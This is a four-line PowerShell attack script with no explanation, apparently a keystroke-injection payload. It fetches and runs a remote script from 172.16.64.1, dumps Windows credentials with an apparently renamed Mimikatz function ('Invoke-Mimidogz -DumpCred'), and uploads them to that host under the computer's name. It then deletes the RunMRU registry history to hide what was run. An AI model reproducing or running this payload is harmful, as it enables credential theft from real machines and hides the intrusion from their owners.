IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1/md.ps1');$o = Invoke-Mimidogz -DumpCred
(New-Object Net.WebClient).UploadString('http://172.16.64.1/'+$env:computername, $o)
(New-Object Net.WebClient).UploadString('http://172.16.64.1/EOF', 'EOF');
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue